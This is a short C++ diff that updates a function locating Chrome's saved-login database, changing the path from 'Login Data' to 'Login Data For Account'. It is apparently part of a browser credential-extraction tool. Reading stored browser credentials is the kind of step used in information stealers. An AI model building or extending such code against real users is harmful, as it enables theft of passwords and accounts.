@@ -60,7 +60,7 @@ std::wstring FindLoginData() {
   }
 
   WCHAR loginDataPath[MAX_PATH];
-  _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
+  _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data For Account", userProfile);
   okay("Full path to Login Data file: %ls", loginDataPath);
   return std::wstring(loginDataPath);
 }
